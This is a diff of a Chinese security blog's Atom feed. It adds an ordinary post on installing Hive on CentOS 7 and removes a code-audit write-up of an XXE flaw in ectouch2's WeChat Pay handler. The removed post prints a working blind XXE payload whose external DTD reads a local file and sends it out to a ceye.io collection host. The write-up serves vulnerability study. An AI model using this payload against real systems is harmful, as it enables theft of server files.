@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://zhengbao.wang/"/>
-  <updated>2019-04-13T10:00:04.759Z</updated>
+  <updated>2019-04-17T02:01:38.533Z</updated>
   <id>https://zhengbao.wang/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Centos7配置安装HIVE</title>
+    <link href="https://zhengbao.wang/Centos7%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85HIVE/"/>
+    <id>https://zhengbao.wang/Centos7配置安装HIVE/</id>
+    <published>2019-04-17T02:00:30.000Z</published>
+    <updated>2019-04-17T02:01:38.533Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自<a href="https://www.yiibai.com/hive/" target="_blank" rel="noopener">https://www.yiibai.com/hive/</a></p><p>本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考<a href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a></p><h2 id="0x01-配置安装HIVE"><a href="#0x01-配置安装HIVE" class="headerlink" title="0x01 配置安装HIVE"></a>0x01 配置安装HIVE</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先<a href="http://www.apache.org/dyn/closer.cgi/hive/" target="_blank" rel="noopener">下载HIVE</a>,为了与Hadoop3.2.0,我选择的hive版本为3.1.1</p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>下载完成后进行解压，根据解压目录自行配置环境变量<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="selector-class">.bashrc</span>   <span class="comment">//配置环境变量</span></span><br><span class="line">source <span class="selector-class">.bashrc</span>  <span class="comment">//使配置生效</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/17/5cb681dc428fd.png" alt></p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>移动到HIVE安装目录下的<code>conf</code>文件夹执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp hive-env<span class="selector-class">.sh</span><span class="selector-class">.template</span> hive-env<span class="selector-class">.sh</span> </span><br><span class="line"></span><br><span class="line">cp hive-default<span class="selector-class">.xml</span><span class="selector-class">.template</span> hive-site<span class="selector-class">.xml</span> </span><br><span class="line"></span><br><span class="line">cp hive-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-log4j2<span class="selector-class">.properties</span> </span><br><span class="line"></span><br><span class="line">cp hive-exec-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-exec-log4j2.properties</span><br></pre></td></tr></table></figure></p><p>修改hive-env.sh,添加JAVA_HOME,HADOOP_HOME及HIVE配置文件目录，请根据自己环境自行修改如下<br><img src="https://i.loli.net/2019/04/17/5cb682abe5216.png" alt></p><h3 id="Schema初始化"><a href="#Schema初始化" class="headerlink" title="Schema初始化"></a>Schema初始化</h3><p>执行<code>schematool -initSchema -dbType derby</code><br>执行成功效果如下<br><img src="https://i.loli.net/2019/04/17/5cb68361a0619.png" alt><br>如果执行failed，修改<code>hive-3.1.1/scripts/metastore/upgrade/derby</code>目录下的<code>hive-schema-2.1.0.derby.sql</code><br>按下图将框中内容使用注释符<code>--</code>注释<br><img src="https://i.loli.net/2019/04/17/5cb68443d23f9.png" alt><br>重新执行<code>schematool -initSchema -dbType derby</code></p><h3 id="启动HIVE"><a href="#启动HIVE" class="headerlink" title="启动HIVE"></a>启动HIVE</h3><p>Schema初始化成功后即可启动hive，命令<code>hive</code><br>启动成功如下，如出现报错，请移至文末<code>0x03 问题解决</code>查看笔者记录部分问题解决方法<br><img src="https://i.loli.net/2019/04/17/5cb68865ee29e.png" alt></p><h2 id="0x02-HIVE命令"><a href="#0x02-HIVE命令" class="headerlink" title="0x02 HIVE命令"></a>0x02 HIVE命令</h2><p><img src="https://i.loli.net/2019/04/17/5cb6889618cb6.png" alt><br>详细命令参考<a href="https://www.jianshu.com/p/b1fafc1bdb03" target="_blank" rel="noopener">Hive常用命令</a></p><h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><h3 id="expansion-character问题"><a href="#expansion-character问题" class="headerlink" title="expansion character问题"></a>expansion character问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6858693bc8.png" alt><br>解决方法：修改报错的<code>hive-site.xml</code>,将报错位置<code>3210</code>行第96个字符删掉</p><h3 id="system-xxx-路径错误问题"><a href="#system-xxx-路径错误问题" class="headerlink" title="${system:xxx}路径错误问题"></a>${system:xxx}路径错误问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6869fbfe64.png" alt><br>出现该问题的主要原因是hive配置文件中不能使用冒号目录定义方法，可将其直接修改为目录。<br>如配置文件中用<code>${system:java.io.tmpdir}</code>定义的路径改为<code>/tmp/</code>,<code>${system:user.name}</code>定义的路径改为<code>${user.name}</code>，其他类似<br>可使用<code>cat -n hive-site.xml |grep system:</code>定位到出现问题的位置<br><img src="https://i.loli.net/2019/04/17/5cb687a138126.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大
+      
+    
+    </summary>
+    
+      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
+    
+    
+      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
+    
+      <category term="hive" scheme="https://zhengbao.wang/tags/hive/"/>
+    
+  </entry>
   
   <entry>
     <title>java代码审计入门之s2-001复现分析</title>
@@ -512,31 +539,6 @@
     
       <category term="python安全" scheme="https://zhengbao.wang/categories/python%E5%AE%89%E5%85%A8/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>ectouch2 微信支付xxe漏洞</title>
-    <link href="https://zhengbao.wang/ectouch2-%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98xxe%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://zhengbao.wang/ectouch2-微信支付xxe漏洞/</id>
-    <published>2019-02-02T07:02:06.000Z</published>
-    <updated>2019-03-07T03:36:30.753Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前有了解过xxe漏洞，但没有在实际环境中分析过，这次刚好看到大佬发的<a href="https://www.anquanke.com/post/id/169960" target="_blank" rel="noopener">Ectouch2.0 分析代码审计流程 (五) xxe漏洞</a>，也跟入学习一波。</p><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>根据文中介绍，定位到wxpay.php的notify方法，可以看到在该方法中，用户可控的inputdata变量直接进入到simplexml_load_string()函数中，那么这里便可能存在xxe漏洞。<br><img src="https://i.loli.net/2019/02/02/5c559dbdcb5b9.png" alt></p><p>搜索全文，查看哪里用到了该方法。<br>找到respond控制器的index方法，该方法中，payobj对象取决于this-&gt;data[‘code’],而且要进入分支还要求this-&gt;data[‘type’]==’notify’,查看其是否可控。<br><img src="https://i.loli.net/2019/02/02/5c559f38acf58.png" alt><br>可以看到这两个变量均可以通过get方法来控制。<br><img src="https://i.loli.net/2019/02/02/5c55a0bc4746f.png" alt></p><p>另外漏洞利用上面判断是否存在通过get.code传入的wxpay插件，因为需要后台启用该插件。<br><img src="https://i.loli.net/2019/02/02/5c55a23c8e6ab.png" alt></p><p>另外由于在notify方法并未对数据进行输出，因此该漏洞为bind xxe，为了测试方便，我们先将数据进行输出。<br><img src="https://i.loli.net/2019/02/02/5c55a2a7bfdff.png" alt></p><p>下面便是构造payload，看看如何才能执行到这里。<br>ectouch采用MVC模式，入口文件index.php中包含了/include/bootstrap.php<br><img src="https://i.loli.net/2019/02/02/5c55a3313e722.png" alt><br>继续跟进，62行看到路由解析函数urlRoute<br><img src="https://i.loli.net/2019/02/02/5c55a3a45ed89.png" alt></p><p>最终定位到display方法<br><img src="https://i.loli.net/2019/02/02/5c55a45d1454d.png" alt><br>获取到其模块控制器方法，分别使用吗m,c,a传入<br><img src="https://i.loli.net/2019/02/02/5c55a4a492646.png" alt></p><p>至此便可构造pyload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?m=default&amp;c=respond&amp;a=index&amp;code=wxpay&amp;type=notify</span><br><span class="line"></span><br><span class="line">post</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe "xxe test"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>至此xxe漏洞确实存在了，但如何利用这个bind xxe呢，总不能让其自己加上输出语句吧。<br><img src="https://i.loli.net/2019/02/02/5c55a5e401841.png" alt></p><p>使用payload<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE convert [ </span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">127.0.0.1</span>/<span class="attr">xxe.dtd</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%remote;%int;%send;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure></p><p>上面payload中外部dtd文件 xxe.dtd内容为<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file<span class="built_in"> SYSTEM </span><span class="string">"php://filter/read=convert.base64-encode/resource=file:///f:/data.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ay82rc.ceye.io/?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>成功读到数据</p><p><img src="https://i.loli.net/2019/02/02/5c55b21ec99da.png" alt></p><p>参考<a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 XXE 漏洞</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前有了解过xxe漏洞，但没有在实际环境中分析过，这次刚好看到大佬发的&lt;a href=&quot;https:
-      
-    
-    </summary>
-    
-      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
